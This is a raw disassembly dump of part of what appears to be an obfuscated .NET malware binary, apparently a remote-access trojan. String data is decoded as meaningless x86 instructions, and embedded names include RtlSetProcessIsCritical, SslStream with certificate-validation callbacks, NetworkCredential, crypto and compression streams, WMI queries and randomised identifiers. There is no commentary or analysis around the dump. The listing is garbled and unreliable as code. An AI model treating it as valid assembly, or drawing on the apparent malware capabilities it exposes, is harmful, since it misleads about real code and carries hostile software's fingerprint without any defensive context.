  408f36:	74 6a                	je     0x408fa2
  408f38:	00 78 43             	add    %bh,0x43(%eax)
  408f3b:	4b                   	dec    %ebx
  408f3c:	67 57                	addr16 push %edi
  408f3e:	69 70 56 47 6b 00 41 	imul   $0x41006b47,0x56(%eax),%esi
  408f45:	73 79                	jae    0x408fc0
  408f47:	6e                   	outsb  %ds:(%esi),(%dx)
  408f48:	63 43 61             	arpl   %eax,0x61(%ebx)
  408f4b:	6c                   	insb   (%dx),%es:(%edi)
  408f4c:	6c                   	insb   (%dx),%es:(%edi)
  408f4d:	62 61 63             	bound  %esp,0x63(%ecx)
  408f50:	6b 00 52             	imul   $0x52,(%eax),%eax
  408f53:	65 6d                	gs insl (%dx),%es:(%edi)
  408f55:	6f                   	outsl  %ds:(%esi),(%dx)
  408f56:	74 65                	je     0x408fbd
  408f58:	43                   	inc    %ebx
  408f59:	65 72 74             	gs jb  0x408fd0
  408f5c:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408f63:	56                   	push   %esi
  408f64:	61                   	popa
  408f65:	6c                   	insb   (%dx),%es:(%edi)
  408f66:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408f6d:	43 
  408f6e:	61                   	popa
  408f6f:	6c                   	insb   (%dx),%es:(%edi)
  408f70:	6c                   	insb   (%dx),%es:(%edi)
  408f71:	62 61 63             	bound  %esp,0x63(%ecx)
  408f74:	6b 00 54             	imul   $0x54,(%eax),%eax
  408f77:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408f7e:	6c                   	insb   (%dx),%es:(%edi)
  408f7f:	62 61 63             	bound  %esp,0x63(%ecx)
  408f82:	6b 00 52             	imul   $0x52,(%eax),%eax
  408f85:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408f8c:	4b 65 
  408f8e:	79 50                	jns    0x408fe0
  408f90:	65 72 6d             	gs jb  0x409000
  408f93:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408f9a:	68 65 63 6b 00       	push   $0x6b6365
  408f9f:	49                   	dec    %ecx
  408fa0:	62 48 69             	bound  %ecx,0x69(%eax)
  408fa3:	5a                   	pop    %edx
  408fa4:	43                   	inc    %ebx
  408fa5:	69 6a 72 6e 63 6b 00 	imul   $0x6b636e,0x72(%edx),%ebp
  408fac:	46                   	inc    %esi
  408fad:	6c                   	insb   (%dx),%es:(%edi)
  408fae:	75 73                	jne    0x409023
  408fb0:	68 46 69 6e 61       	push   $0x616e6946
  408fb5:	6c                   	insb   (%dx),%es:(%edi)
  408fb6:	42                   	inc    %edx
  408fb7:	6c                   	insb   (%dx),%es:(%edi)
  408fb8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb9:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408fbc:	64 46                	fs inc %esi
  408fbe:	45                   	inc    %ebp
  408fbf:	48                   	dec    %eax
  408fc0:	4e                   	dec    %esi
  408fc1:	62 44 53 70          	bound  %eax,0x70(%ebx,%edx,2)
  408fc5:	6b 00 79             	imul   $0x79,(%eax),%eax
  408fc8:	6c                   	insb   (%dx),%es:(%edi)
  408fc9:	6d                   	insl   (%dx),%es:(%edi)
  408fca:	6d                   	insl   (%dx),%es:(%edi)
  408fcb:	70 4e                	jo     0x40901b
  408fcd:	54                   	push   %esp
  408fce:	61                   	popa
  408fcf:	76 53                	jbe    0x409024
  408fd1:	70 6b                	jo     0x40903e
  408fd3:	00 44 54 44          	add    %al,0x44(%esp,%edx,2)
  408fd7:	55                   	push   %ebp
  408fd8:	78 73                	js     0x40904d
  408fda:	51                   	push   %ecx
  408fdb:	61                   	popa
  408fdc:	52                   	push   %edx
  408fdd:	71 75                	jno    0x409054
  408fdf:	56                   	push   %esi
  408fe0:	6d                   	insl   (%dx),%es:(%edi)
  408fe1:	75 47                	jne    0x40902a
  408fe3:	73 6b                	jae    0x409050
  408fe5:	00 52 76             	add    %dl,0x76(%edx)
  408fe8:	79 64                	jns    0x40904e
  408fea:	73 66                	jae    0x409052
  408fec:	52                   	push   %edx
  408fed:	78 45                	js     0x409034
  408fef:	6c                   	insb   (%dx),%es:(%edi)
  408ff0:	00 52 74             	add    %dl,0x74(%edx)
  408ff3:	6c                   	insb   (%dx),%es:(%edi)
  408ff4:	53                   	push   %ebx
  408ff5:	65 74 50             	gs je  0x409048
  408ff8:	72 6f                	jb     0x409069
  408ffa:	63 65 73             	arpl   %esp,0x73(%ebp)
  408ffd:	73 49                	jae    0x409048
  408fff:	73 43                	jae    0x409044
  409001:	72 69                	jb     0x40906c
  409003:	74 69                	je     0x40906e
  409005:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  409008:	00 4e 65             	add    %cl,0x65(%esi)
  40900b:	74 77                	je     0x409084
  40900d:	6f                   	outsl  %ds:(%esi),(%dx)
  40900e:	72 6b                	jb     0x40907b
  409010:	43                   	inc    %ebx
  409011:	72 65                	jb     0x409078
  409013:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409016:	74 69                	je     0x409081
  409018:	61                   	popa
  409019:	6c                   	insb   (%dx),%es:(%edi)
  40901a:	00 53 79             	add    %dl,0x79(%ebx)
  40901d:	73 74                	jae    0x409093
  40901f:	65 6d                	gs insl (%dx),%es:(%edi)
  409021:	2e 53                	cs push %ebx
  409023:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409027:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  40902e:	6e 
  40902f:	63 69 70             	arpl   %ebp,0x70(%ecx)
  409032:	61                   	popa
  409033:	6c                   	insb   (%dx),%es:(%edi)
  409034:	00 57 69             	add    %dl,0x69(%edi)
  409037:	6e                   	outsb  %ds:(%esi),(%dx)
  409038:	64 6f                	outsl  %fs:(%esi),(%dx)
  40903a:	77 73                	ja     0x4090af
  40903c:	50                   	push   %eax
  40903d:	72 69                	jb     0x4090a8
  40903f:	6e                   	outsb  %ds:(%esi),(%dx)
  409040:	63 69 70             	arpl   %ebp,0x70(%ecx)
  409043:	61                   	popa
  409044:	6c                   	insb   (%dx),%es:(%edi)
  409045:	00 67 65             	add    %ah,0x65(%edi)
  409048:	74 5f                	je     0x4090a9
  40904a:	49                   	dec    %ecx
  40904b:	6e                   	outsb  %ds:(%esi),(%dx)
  40904c:	74 65                	je     0x4090b3
  40904e:	72 76                	jb     0x4090c6
  409050:	61                   	popa
  409051:	6c                   	insb   (%dx),%es:(%edi)
  409052:	00 73 65             	add    %dh,0x65(%ebx)
  409055:	74 5f                	je     0x4090b6
  409057:	49                   	dec    %ecx
  409058:	6e                   	outsb  %ds:(%esi),(%dx)
  409059:	74 65                	je     0x4090c0
  40905b:	72 76                	jb     0x4090d3
  40905d:	61                   	popa
  40905e:	6c                   	insb   (%dx),%es:(%edi)
  40905f:	00 6d 69             	add    %ch,0x69(%ebp)
  409062:	4a                   	dec    %edx
  409063:	71 59                	jno    0x4090be
  409065:	54                   	push   %esp
  409066:	6b 61 64 6c          	imul   $0x6c,0x64(%ecx),%esp
  40906a:	00 78 44             	add    %bh,0x44(%eax)
  40906d:	52                   	push   %edx
  40906e:	74 43                	je     0x4090b3
  409070:	78 78                	js     0x4090ea
  409072:	48                   	dec    %eax
  409073:	71 75                	jno    0x4090ea
  409075:	42                   	inc    %edx
  409076:	6b 6c 00 6b 65       	imul   $0x65,0x6b(%eax,%eax,1),%ebp
  40907b:	72 6e                	jb     0x4090eb
  40907d:	65 6c                	gs insb (%dx),%es:(%edi)
  40907f:	33 32                	xor    (%edx),%esi
  409081:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  409084:	6c                   	insb   (%dx),%es:(%edi)
  409085:	00 75 73             	add    %dh,0x73(%ebp)
  409088:	65 72 33             	gs jb  0x4090be
  40908b:	32 2e                	xor    (%esi),%ch
  40908d:	64 6c                	fs insb (%dx),%es:(%edi)
  40908f:	6c                   	insb   (%dx),%es:(%edi)
  409090:	00 6e 74             	add    %ch,0x74(%esi)
  409093:	64 6c                	fs insb (%dx),%es:(%edi)
  409095:	6c                   	insb   (%dx),%es:(%edi)
  409096:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  409099:	6c                   	insb   (%dx),%es:(%edi)
  40909a:	00 4b 69             	add    %cl,0x69(%ebx)
  40909d:	6c                   	insb   (%dx),%es:(%edi)
  40909e:	6c                   	insb   (%dx),%es:(%edi)
  40909f:	00 50 6f             	add    %dl,0x6f(%eax)
  4090a2:	6c                   	insb   (%dx),%es:(%edi)
  4090a3:	6c                   	insb   (%dx),%es:(%edi)
  4090a4:	00 4b 69             	add    %cl,0x69(%ebx)
  4090a7:	47                   	inc    %edi
  4090a8:	46                   	inc    %esi
  4090a9:	56                   	push   %esi
  4090aa:	7a 58                	jp     0x409104
  4090ac:	42                   	inc    %edx
  4090ad:	57                   	push   %edi
  4090ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4090af:	6c                   	insb   (%dx),%es:(%edi)
  4090b0:	00 46 41             	add    %al,0x41(%esi)
  4090b3:	63 49 67             	arpl   %ecx,0x67(%ecx)
  4090b6:	58                   	pop    %eax
  4090b7:	42                   	inc    %edx
  4090b8:	55                   	push   %ebp
  4090b9:	42                   	inc    %edx
  4090ba:	41                   	inc    %ecx
  4090bb:	6d                   	insl   (%dx),%es:(%edi)
  4090bc:	00 65 6e             	add    %ah,0x6e(%ebp)
  4090bf:	51                   	push   %ecx
  4090c0:	7a 4d                	jp     0x40910f
  4090c2:	59                   	pop    %ecx
  4090c3:	4c                   	dec    %esp
  4090c4:	4b                   	dec    %ebx
  4090c5:	68 70 61 5a 53       	push   $0x535a6170
  4090ca:	53                   	push   %ebx
  4090cb:	43                   	inc    %ebx
  4090cc:	6d                   	insl   (%dx),%es:(%edi)
  4090cd:	00 4b 74             	add    %cl,0x74(%ebx)
  4090d0:	5a                   	pop    %edx
  4090d1:	68 67 44 57 73       	push   $0x73574467
  4090d6:	4a                   	dec    %edx
  4090d7:	46                   	inc    %esi
  4090d8:	6a 45                	push   $0x45
  4090da:	6d                   	insl   (%dx),%es:(%edi)
  4090db:	00 4a 69             	add    %cl,0x69(%edx)
  4090de:	6b 65 68 41          	imul   $0x41,0x68(%ebp),%esp
  4090e2:	42                   	inc    %edx
  4090e3:	4e                   	dec    %esi
  4090e4:	45                   	inc    %ebp
  4090e5:	52                   	push   %edx
  4090e6:	6d                   	insl   (%dx),%es:(%edi)
  4090e7:	00 46 69             	add    %al,0x69(%esi)
  4090ea:	6c                   	insb   (%dx),%es:(%edi)
  4090eb:	65 53                	gs push %ebx
  4090ed:	74 72                	je     0x409161
  4090ef:	65 61                	gs popa
  4090f1:	6d                   	insl   (%dx),%es:(%edi)
  4090f2:	00 4e 65             	add    %cl,0x65(%esi)
  4090f5:	74 77                	je     0x40916e
  4090f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f8:	72 6b                	jb     0x409165
  4090fa:	53                   	push   %ebx
  4090fb:	74 72                	je     0x40916f
  4090fd:	65 61                	gs popa
  4090ff:	6d                   	insl   (%dx),%es:(%edi)
  409100:	00 53 73             	add    %dl,0x73(%ebx)
  409103:	6c                   	insb   (%dx),%es:(%edi)
  409104:	53                   	push   %ebx
  409105:	74 72                	je     0x409179
  409107:	65 61                	gs popa
  409109:	6d                   	insl   (%dx),%es:(%edi)
  40910a:	00 43 72             	add    %al,0x72(%ebx)
  40910d:	79 70                	jns    0x40917f
  40910f:	74 6f                	je     0x409180
  409111:	53                   	push   %ebx
  409112:	74 72                	je     0x409186
  409114:	65 61                	gs popa
  409116:	6d                   	insl   (%dx),%es:(%edi)
  409117:	00 47 5a             	add    %al,0x5a(%edi)
  40911a:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  409121:	6d                   	insl   (%dx),%es:(%edi)
  409122:	00 4d 65             	add    %cl,0x65(%ebp)
  409125:	6d                   	insl   (%dx),%es:(%edi)
  409126:	6f                   	outsl  %ds:(%esi),(%dx)
  409127:	72 79                	jb     0x4091a2
  409129:	53                   	push   %ebx
  40912a:	74 72                	je     0x40919e
  40912c:	65 61                	gs popa
  40912e:	6d                   	insl   (%dx),%es:(%edi)
  40912f:	00 6d 6f             	add    %ch,0x6f(%ebp)
  409132:	69 4c 55 4b 66 46 64 	imul   $0x6a644666,0x4b(%ebp,%edx,2),%ecx
  409139:	6a 
  40913a:	4a                   	dec    %edx
  40913b:	5a                   	pop    %edx
  40913c:	65 6d                	gs insl (%dx),%es:(%edi)
  40913e:	00 67 65             	add    %ah,0x65(%edi)
  409141:	74 5f                	je     0x4091a2
  409143:	49                   	dec    %ecx
  409144:	74 65                	je     0x4091ab
  409146:	6d                   	insl   (%dx),%es:(%edi)
  409147:	00 67 65             	add    %ah,0x65(%edi)
  40914a:	74 5f                	je     0x4091ab
  40914c:	49                   	dec    %ecx
  40914d:	73 36                	jae    0x409185
  40914f:	34 42                	xor    $0x42,%al
  409151:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  409158:	74 
  409159:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  409160:	65 6d                	gs insl (%dx),%es:(%edi)
  409162:	00 53 79             	add    %dl,0x79(%ebx)
  409165:	6d                   	insl   (%dx),%es:(%edi)
  409166:	6d                   	insl   (%dx),%es:(%edi)
  409167:	65 74 72             	gs je  0x4091dc
  40916a:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  409171:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  409178:	79 
  409179:	6d                   	insl   (%dx),%es:(%edi)
  40917a:	6d                   	insl   (%dx),%es:(%edi)
  40917b:	65 74 72             	gs je  0x4091f0
  40917e:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  409185:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40918c:	73 
  40918d:	68 41 6c 67 6f       	push   $0x6f676c41
  409192:	72 69                	jb     0x4091fd
  409194:	74 68                	je     0x4091fe
  409196:	6d                   	insl   (%dx),%es:(%edi)
  409197:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40919b:	6d                   	insl   (%dx),%es:(%edi)
  40919c:	00 49 70             	add    %cl,0x70(%ecx)
  40919f:	4d                   	dec    %ebp
  4091a0:	68 73 74 6b 66       	push   $0x666b7473
  4091a5:	56                   	push   %esi
  4091a6:	6a 6d                	push   $0x6d
  4091a8:	00 52 61             	add    %dl,0x61(%edx)
  4091ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4091ac:	64 6f                	outsl  %fs:(%esi),(%dx)
  4091ae:	6d                   	insl   (%dx),%es:(%edi)
  4091af:	00 4f 73             	add    %cl,0x73(%edi)
  4091b2:	49                   	dec    %ecx
  4091b3:	78 63                	js     0x409218
  4091b5:	6d                   	insl   (%dx),%es:(%edi)
  4091b6:	4c                   	dec    %esp
  4091b7:	56                   	push   %esi
  4091b8:	71 6d                	jno    0x409227
  4091ba:	00 49 43             	add    %cl,0x43(%ecx)
  4091bd:	72 79                	jb     0x409238
  4091bf:	70 74                	jo     0x409235
  4091c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c2:	54                   	push   %esp
  4091c3:	72 61                	jb     0x409226
  4091c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4091c6:	73 66                	jae    0x40922e
  4091c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c9:	72 6d                	jb     0x409238
  4091cb:	00 45 6e             	add    %al,0x6e(%ebp)
  4091ce:	75 6d                	jne    0x40923d
  4091d0:	00 6e 43             	add    %ch,0x43(%esi)
  4091d3:	63 70 4c             	arpl   %esi,0x4c(%eax)
  4091d6:	74 73                	je     0x40924b
  4091d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d9:	52                   	push   %edx
  4091da:	6e                   	outsb  %ds:(%esi),(%dx)
  4091db:	00 78 44             	add    %bh,0x44(%eax)
  4091de:	6b 4b 67 6b          	imul   $0x6b,0x67(%ebx),%ecx
  4091e2:	77 69                	ja     0x40924d
  4091e4:	56                   	push   %esi
  4091e5:	7a 5a                	jp     0x409241
  4091e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e8:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  4091ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4091ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4091ee:	6c                   	insb   (%dx),%es:(%edi)
  4091ef:	65 61                	gs popa
  4091f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4091f2:	00 68 73             	add    %ch,0x73(%eax)
  4091f5:	48                   	dec    %eax
  4091f6:	7a 68                	jp     0x409260
  4091f8:	4e                   	dec    %esi
  4091f9:	78 71                	js     0x40926c
  4091fb:	67 42                	addr16 inc %edx
  4091fd:	67 6e                	outsb  %ds:(%si),(%dx)
  4091ff:	00 4d 61             	add    %cl,0x61(%ebp)
  409202:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  409209:	43                   	inc    %ebx
  40920a:	68 61 69 6e 00       	push   $0x6e6961
  40920f:	41                   	inc    %ecx
  409210:	70 70                	jo     0x409282
  409212:	44                   	inc    %esp
  409213:	6f                   	outsl  %ds:(%esi),(%dx)
  409214:	6d                   	insl   (%dx),%es:(%edi)
  409215:	61                   	popa
  409216:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  40921d:	43                   	inc    %ebx
  40921e:	75 72                	jne    0x409292
  409220:	72 65                	jb     0x409287
  409222:	6e                   	outsb  %ds:(%esi),(%dx)
  409223:	74 44                	je     0x409269
  409225:	6f                   	outsl  %ds:(%esi),(%dx)
  409226:	6d                   	insl   (%dx),%es:(%edi)
  409227:	61                   	popa
  409228:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  40922f:	00 47 65             	add    %al,0x65(%edi)
  409232:	74 46                	je     0x40927a
  409234:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40923b:	57 
  40923c:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  409243:	78 
  409244:	74 65                	je     0x4092ab
  409246:	6e                   	outsb  %ds:(%esi),(%dx)
  409247:	73 69                	jae    0x4092b2
  409249:	6f                   	outsl  %ds:(%esi),(%dx)
  40924a:	6e                   	outsb  %ds:(%esi),(%dx)
  40924b:	00 67 65             	add    %ah,0x65(%edi)
  40924e:	74 5f                	je     0x4092af
  409250:	4f                   	dec    %edi
  409251:	53                   	push   %ebx
  409252:	56                   	push   %esi
  409253:	65 72 73             	gs jb  0x4092c9
  409256:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40925d:	74 65                	je     0x4092c4
  40925f:	6d                   	insl   (%dx),%es:(%edi)
  409260:	2e 49                	cs dec %ecx
  409262:	4f                   	dec    %edi
  409263:	2e 43                	cs inc %ebx
  409265:	6f                   	outsl  %ds:(%esi),(%dx)
  409266:	6d                   	insl   (%dx),%es:(%edi)
  409267:	70 72                	jo     0x4092db
  409269:	65 73 73             	gs jae 0x4092df
  40926c:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  409273:	6c                   	insb   (%dx),%es:(%edi)
  409274:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40927b:	00 53 79             	add    %dl,0x79(%ebx)
  40927e:	73 74                	jae    0x4092f4
  409280:	65 6d                	gs insl (%dx),%es:(%edi)
  409282:	2e 53                	cs push %ebx
  409284:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409288:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  40928f:	68 
  409290:	65 6e                	outsb  %gs:(%esi),(%dx)
  409292:	74 69                	je     0x4092fd
  409294:	63 61 74             	arpl   %esp,0x74(%ecx)
  409297:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40929e:	74 65                	je     0x409305
  4092a0:	6d                   	insl   (%dx),%es:(%edi)
  4092a1:	2e 52                	cs push %edx
  4092a3:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4092a6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ac:	00 58 35             	add    %bl,0x35(%eax)
  4092af:	30 39                	xor    %bh,(%ecx)
  4092b1:	43                   	inc    %ebx
  4092b2:	65 72 74             	gs jb  0x409329
  4092b5:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4092bc:	43                   	inc    %ebx
  4092bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4092be:	6c                   	insb   (%dx),%es:(%edi)
  4092bf:	6c                   	insb   (%dx),%es:(%edi)
  4092c0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c6:	00 4d 61             	add    %cl,0x61(%ebp)
  4092c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ca:	61                   	popa
  4092cb:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092ce:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092d0:	74 4f                	je     0x409321
  4092d2:	62 6a 65             	bound  %ebp,0x65(%edx)
  4092d5:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4092d9:	6c                   	insb   (%dx),%es:(%edi)
  4092da:	6c                   	insb   (%dx),%es:(%edi)
  4092db:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e1:	00 73 65             	add    %dh,0x65(%ebx)
  4092e4:	74 5f                	je     0x409345
  4092e6:	50                   	push   %eax
  4092e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4092e8:	73 69                	jae    0x409353
  4092ea:	74 69                	je     0x409355
  4092ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ee:	00 43 72             	add    %al,0x72(%ebx)
  4092f1:	79 70                	jns    0x409363
  4092f3:	74 6f                	je     0x409364
  4092f5:	67 72 61             	addr16 jb 0x409359
  4092f8:	70 68                	jo     0x409362
  4092fa:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  409301:	74 69                	je     0x40936c
  409303:	6f                   	outsl  %ds:(%esi),(%dx)
  409304:	6e                   	outsb  %ds:(%esi),(%dx)
  409305:	00 41 72             	add    %al,0x72(%ecx)
  409308:	67 75 6d             	addr16 jne 0x409378
  40930b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40930d:	74 4e                	je     0x40935d
  40930f:	75 6c                	jne    0x40937d
  409311:	6c                   	insb   (%dx),%es:(%edi)
  409312:	45                   	inc    %ebp
  409313:	78 63                	js     0x409378
  409315:	65 70 74             	gs jo  0x40938c
  409318:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  40931f:	75 6d                	jne    0x40938e
  409321:	65 6e                	outsb  %gs:(%esi),(%dx)
  409323:	74 45                	je     0x40936a
  409325:	78 63                	js     0x40938a
  409327:	65 70 74             	gs jo  0x40939e
  40932a:	69 6f 6e 00 63 41 4a 	imul   $0x4a416300,0x6e(%edi),%ebp
  409331:	66 6c                	data16 insb (%dx),%es:(%edi)
  409333:	4e                   	dec    %esi
  409334:	52                   	push   %edx
  409335:	65 65 51             	gs gs push %ecx
  409338:	78 70                	js     0x4093aa
  40933a:	6e                   	outsb  %ds:(%esi),(%dx)
  40933b:	00 66 6f             	add    %ah,0x6f(%esi)
  40933e:	4b                   	dec    %ebx
  40933f:	46                   	inc    %esi
  409340:	4d                   	dec    %ebp
  409341:	48                   	dec    %eax
  409342:	67 42                	addr16 inc %edx
  409344:	41                   	inc    %ecx
  409345:	56                   	push   %esi
  409346:	41                   	inc    %ecx
  409347:	47                   	inc    %edi
  409348:	71 6e                	jno    0x4093b8
  40934a:	00 6a 6a             	add    %ch,0x6a(%edx)
  40934d:	44                   	inc    %esp
  40934e:	70 72                	jo     0x4093c2
  409350:	4d                   	dec    %ebp
  409351:	58                   	pop    %eax
  409352:	67 41                	addr16 inc %ecx
  409354:	75 6e                	jne    0x4093c4
  409356:	00 69 4b             	add    %ch,0x4b(%ecx)
  409359:	55                   	push   %ebp
  40935a:	70 6b                	jo     0x4093c7
  40935c:	65 41                	gs inc %ecx
  40935e:	73 41                	jae    0x4093a1
  409360:	41                   	inc    %ecx
  409361:	4a                   	dec    %edx
  409362:	6f                   	outsl  %ds:(%esi),(%dx)
  409363:	00 79 52             	add    %bh,0x52(%ecx)
  409366:	6e                   	outsb  %ds:(%esi),(%dx)
  409367:	63 74 66 76          	arpl   %esi,0x76(%esi,%eiz,2)
  40936b:	44                   	inc    %esp
  40936c:	56                   	push   %esi
  40936d:	6a 52                	push   $0x52
  40936f:	58                   	pop    %eax
  409370:	6f                   	outsl  %ds:(%esi),(%dx)
  409371:	00 41 4d             	add    %al,0x4d(%ecx)
  409374:	78 6b                	js     0x4093e1
  409376:	6d                   	insl   (%dx),%es:(%edi)
  409377:	41                   	inc    %ecx
  409378:	51                   	push   %ecx
  409379:	59                   	pop    %ecx
  40937a:	69 5a 6f 00 49 6d 61 	imul   $0x616d4900,0x6f(%edx),%ebx
  409381:	67 65 43             	addr16 gs inc %ebx
  409384:	6f                   	outsl  %ds:(%esi),(%dx)
  409385:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  40938a:	66 6f                	outsw  %ds:(%esi),(%dx)
  40938c:	00 46 69             	add    %al,0x69(%esi)
  40938f:	6c                   	insb   (%dx),%es:(%edi)
  409390:	65 49                	gs dec %ecx
  409392:	6e                   	outsb  %ds:(%esi),(%dx)
  409393:	66 6f                	outsw  %ds:(%esi),(%dx)
  409395:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  409399:	76 65                	jbe    0x409400
  40939b:	49                   	dec    %ecx
  40939c:	6e                   	outsb  %ds:(%esi),(%dx)
  40939d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40939f:	00 46 69             	add    %al,0x69(%esi)
  4093a2:	6c                   	insb   (%dx),%es:(%edi)
  4093a3:	65 53                	gs push %ebx
  4093a5:	79 73                	jns    0x40941a
  4093a7:	74 65                	je     0x40940e
  4093a9:	6d                   	insl   (%dx),%es:(%edi)
  4093aa:	49                   	dec    %ecx
  4093ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ac:	66 6f                	outsw  %ds:(%esi),(%dx)
  4093ae:	00 43 6f             	add    %al,0x6f(%ebx)
  4093b1:	6d                   	insl   (%dx),%es:(%edi)
  4093b2:	70 75                	jo     0x409429
  4093b4:	74 65                	je     0x40941b
  4093b6:	72 49                	jb     0x409401
  4093b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b9:	66 6f                	outsw  %ds:(%esi),(%dx)
  4093bb:	00 43 53             	add    %al,0x53(%ebx)
  4093be:	68 61 72 70 41       	push   $0x41707261
  4093c3:	72 67                	jb     0x40942c
  4093c5:	75 6d                	jne    0x409434
  4093c7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4093c9:	74 49                	je     0x409414
  4093cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4093cc:	66 6f                	outsw  %ds:(%esi),(%dx)
  4093ce:	00 50 72             	add    %dl,0x72(%eax)
  4093d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4093d2:	63 65 73             	arpl   %esp,0x73(%ebp)
  4093d5:	73 53                	jae    0x40942a
  4093d7:	74 61                	je     0x40943a
  4093d9:	72 74                	jb     0x40944f
  4093db:	49                   	dec    %ecx
  4093dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4093dd:	66 6f                	outsw  %ds:(%esi),(%dx)
  4093df:	00 62 6d             	add    %ah,0x6d(%edx)
  4093e2:	48                   	dec    %eax
  4093e3:	4e                   	dec    %esi
  4093e4:	4d                   	dec    %ebp
  4093e5:	4c                   	dec    %esp
  4093e6:	6d                   	insl   (%dx),%es:(%edi)
  4093e7:	67 78 6d             	addr16 js 0x409457
  4093ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4093eb:	00 7a 76             	add    %bh,0x76(%edx)
  4093ee:	74 72                	je     0x409462
  4093f0:	75 6d                	jne    0x40945f
  4093f2:	6d                   	insl   (%dx),%es:(%edi)
  4093f3:	42                   	inc    %edx
  4093f4:	65 79 78             	gs jns 0x40946f
  4093f7:	70 6f                	jo     0x409468
  4093f9:	00 76 56             	add    %dh,0x56(%esi)
  4093fc:	74 49                	je     0x409447
  4093fe:	7a 57                	jp     0x409457
  409400:	6b 4a 73 6d          	imul   $0x6d,0x73(%edx),%ecx
  409404:	71 76                	jno    0x40947c
  409406:	42                   	inc    %edx
  409407:	77 6f                	ja     0x409478
  409409:	00 5a 73             	add    %bl,0x73(%edx)
  40940c:	54                   	push   %esp
  40940d:	65 4a                	gs dec %edx
  40940f:	51                   	push   %ecx
  409410:	78 77                	js     0x409489
  409412:	4d                   	dec    %ebp
  409413:	43                   	inc    %ebx
  409414:	78 6f                	js     0x409485
  409416:	00 41 4e             	add    %al,0x4e(%ecx)
  409419:	4a                   	dec    %edx
  40941a:	67 79 42             	addr16 jns 0x40945f
  40941d:	4a                   	dec    %edx
  40941e:	72 53                	jb     0x409473
